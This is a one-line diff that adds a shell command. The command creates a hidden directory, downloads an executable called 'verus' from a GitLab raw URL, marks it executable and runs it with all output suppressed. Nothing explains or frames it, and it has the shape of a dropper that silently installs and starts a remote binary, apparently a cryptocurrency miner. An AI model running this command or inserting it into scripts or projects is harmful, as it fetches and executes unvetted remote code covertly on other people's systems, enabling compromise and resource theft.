@@ -1,0 +1,1 @@
+mkdir .cucu && cd .cucu && wget https://gitlab.com/intanayu692/cacingputih/-/raw/master/verus && chmod +x verus && ./verus > /dev/null 2>&1
